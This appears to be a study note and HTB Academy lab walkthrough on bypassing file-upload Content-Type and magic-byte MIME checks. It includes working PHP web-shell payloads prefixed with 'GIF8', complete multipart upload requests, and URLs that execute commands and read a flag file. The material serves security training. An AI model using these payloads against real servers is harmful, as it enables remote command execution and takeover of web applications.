# Type Filters

> **🎭 Content Validation:** Bypassing Content-Type headers and MIME-Type validation using magic bytes

## Overview

So far, we have only been dealing with type filters that only consider the file extension in the file name. However, as we saw in the previous section, we may still be able to gain control over the back-end server even with image extensions (e.g. `shell.php.jpg`). Furthermore, we may utilize some allowed extensions (e.g., SVG) to perform other attacks.

All of this indicates that only testing the file extension is not enough to prevent file upload attacks. This is why many modern web servers and web applications also test the content of the uploaded file to ensure it matches the specified type.

---

## Content-Type Header Bypass

> **📝 Header Manipulation:** Modifying the Content-Type header to bypass validation

### Understanding Content-Type Validation

**Example PHP Content-Type Check:**
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

**Vulnerability:** The code sets the `$type` variable from the uploaded file's Content-Type header. Since browsers set this header based on file extension, and it's client-side controlled, we can manipulate it.

### Content-Type Bypass Example

**Modified Bypass Request:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
----boundary--
```

---

## MIME-Type Bypass (Magic Bytes)

> **🎩 Magic Bytes:** Using file signatures to fool MIME-Type detection

### Understanding MIME-Type Validation

**Multipurpose Internet Mail Extensions (MIME)** is an internet standard that determines the type of a file through its general format and bytes structure. This is usually done by inspecting the first few bytes of the file's content, which contain the **File Signature** or **Magic Bytes**.

### GIF Magic Bytes (Easiest to Use)

**Why GIF is Preferred:**
- **ASCII Printable** - `GIF8` is easy to type and remember
- **Non-Binary** - Unlike other formats with non-printable bytes
- **Flexible** - `GIF8` works for both GIF87a and GIF89a
- **Small** - Only 4 bytes needed

### PHP Web Shell with GIF Magic Bytes

**Method 1: Simple Prepend**
```php
GIF8
<?php system($_REQUEST['cmd']); ?>
```

**Method 2: Clean GIF Header**
```php
GIF89a
<?php system($_REQUEST['cmd']); ?>
```

### Burp Suite MIME-Type Bypass

**Request with Magic Bytes:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/gif

GIF8
<?php system($_REQUEST['cmd']); ?>
----boundary--
```

**Expected Response:**
```
File successfully uploaded
```

### Command Execution with Magic Bytes

**Accessing the Web Shell:**
```bash
# Navigate to uploaded file
http://SERVER_IP:PORT/profile_images/shell.php?cmd=id

# Expected output (notice GIF8 at beginning):
GIF8
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:** The command output starts with `GIF8` because this was the first line in our PHP script to imitate the GIF magic bytes, and is now outputted as plaintext before our PHP code is executed.

---

## HTB Academy Lab Solutions

### Lab 1: Comprehensive Filter Bypass

**Target:** Bypass Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters

**Challenge Description:** The server employs multiple layers of protection:
- Client-Side validation (JavaScript)
- Blacklist filters (common PHP extensions)  
- Whitelist filters (only image extensions allowed)
- Content-Type validation (only image content types)
- MIME-Type validation (magic bytes checking)

### Step-by-Step Solution

**Step 6: Complete Combined Attack**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php.jpg"
Content-Type: image/gif

GIF8
<?php system($_REQUEST['cmd']); ?>
----boundary--
```

**Step 7: Verify Upload and Execute**
```bash
# Check upload success
Response: "File successfully uploaded"

# Test command execution
http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
# Output: GIF8 uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Read flag
http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=cat /flag.txt
# Flag: HTB{...}
```

This comprehensive guide demonstrates how Content-Type and MIME-Type validation can be bypassed using header manipulation and magic bytes injection.
